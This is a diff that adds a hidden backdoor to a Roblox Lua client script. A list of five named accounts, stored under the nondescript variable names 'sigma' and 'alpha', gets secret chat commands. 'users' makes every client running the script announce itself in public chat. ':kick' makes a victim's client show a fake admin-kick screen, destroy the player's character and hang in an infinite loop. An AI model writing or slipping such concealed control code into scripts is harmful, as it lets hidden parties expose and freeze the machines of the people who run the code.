@@ -14,6 +14,122 @@ local Player = game:GetService("Players").LocalPlayer
 local Mouse = Player:GetMouse()
 local StarterGui = game:GetService("StarterGui")
 
+local sigma = {
+    "pedrood2", 
+    "iidino122",
+    "iAmLegitTrust_p",
+    "IlllIlIlIlIllIIllII", 
+    "Milaneso202_xd"
+}
+
+local alpha = "users"
+
+-- Verificar si el jugador es admin
+local function admins(name)
+    for _, admin in ipairs(sigma) do 
+        if admin:lower() == name:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+-- Función para ejecutar el kick GUI y expulsar al jugador
+local function kickPlayer(targetPlayer)
+    local kickgui11 = Instance.new("ScreenGui")
+    local framidykick = Instance.new("Frame")
+    local kickLabel = Instance.new("TextLabel")
+
+    -- Crear GUI de kick
+    kickgui11.Name = "kickgui11"
+    kickgui11.Parent = targetPlayer:WaitForChild("PlayerGui")
+    kickgui11.ResetOnSpawn = false
+
+    framidykick.Name = "framidykick"
+    framidykick.Parent = kickgui11
+    framidykick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    framidykick.BackgroundTransparency = 0.5
+    framidykick.BorderSizePixel = 0
+    framidykick.Size = UDim2.new(1, 0, 1, 0)
+
+    kickLabel.Name = "kickLabel"
+    kickLabel.Parent = framidykick
+    kickLabel.BackgroundTransparency = 1
+    kickLabel.Size = UDim2.new(0.7, 0, 0.7, 0)
+    kickLabel.Font = Enum.Font.SourceSansBold
+    kickLabel.Text = "KICKED FROM THE GAME BY ADMIN/DEV"
+    kickLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    kickLabel.TextScaled = true
+    kickLabel.TextWrapped = true
+
+    -- Mover al jugador a una ubicación específica y "kickearlo"
+    local character = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
+    character:SetPrimaryPartCFrame(CFrame.new(-292.83, 60.00, -75.28))
+
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid:Destroy() -- Forzar la muerte del jugador
+    end
+
+    wait(1)
+    -- Bloquear al jugador en un bucle infinito (efecto visual de kick)
+    while true do
+    end
+end
+
+-- Buscar jugador por nombre parcial
+local function findPlayerByName(partialName)
+    partialName = partialName:lower()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Name:lower():find(partialName) then
+            return player
+        end
+    end
+    return nil
+end
+
+-- Manejo de comandos de chat
+local function onChatMessage(player, message)
+    if admins(player.Name) or admins(player.DisplayName) then
+        if message:lower() == alpha:lower() then
+            local args = {
+                [1] = ">>> HII!",
+                [2] = "All"
+            }
+            game:GetService("ReplicatedStorage")
+                :WaitForChild("DefaultChatSystemChatEvents")
+                :WaitForChild("SayMessageRequest")
+                :FireServer(unpack(args))
+        end
+
+        if message:sub(1, 5):lower() == ":kick" then
+            local partialName = message:sub(7):lower()
+            local targetPlayer = findPlayerByName(partialName)
+            if targetPlayer then
+                kickPlayer(targetPlayer)
+            else
+                player:Kick("Player not found: " .. partialName)
+            end
+        end
+    end
+end
+
+-- Conectar evento para nuevos jugadores
+local players = game:GetService("Players")
+
+players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onChatMessage(player, message)
+    end)
+end)
+
+-- Conectar evento para jugadores actuales
+for _, player in ipairs(players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onChatMessage(player, message)
+    end)
+end
+
 -- Función para mostrar una notificación
 local function showNotification(title, text, duration)
     StarterGui:SetCore("SendNotification", {
